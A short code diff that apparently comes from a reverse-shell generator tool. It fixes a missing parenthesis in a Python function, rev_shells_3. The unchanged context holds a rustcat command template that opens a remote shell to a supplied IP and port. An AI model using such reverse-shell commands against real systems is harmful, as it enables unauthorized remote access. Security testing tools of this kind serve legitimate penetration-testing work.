@@ -2,7 +2,7 @@
 def rev_shells_3(num, ip, port, shell):
 
     # Convert the port to a string
-    port = str(port
+    port = str(port)
 
     # Define different reverse shell commands for various languages
     rustcat = f'''rcat connect -s {shell} {ip} {port}'''
